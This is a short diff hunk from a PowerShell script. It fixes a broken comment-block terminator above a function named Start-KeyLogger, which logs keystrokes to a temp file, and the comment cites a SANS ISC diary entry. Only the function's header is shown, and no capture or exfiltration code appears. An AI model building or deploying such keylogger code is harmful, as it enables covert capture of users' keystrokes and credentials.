@@ -1,7 +1,7 @@
 <#
   .DESCRIPTION 
   https://isc.sans.edu/diary/rss/24676
->
+#>
 
 #requires -Version 2
 function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
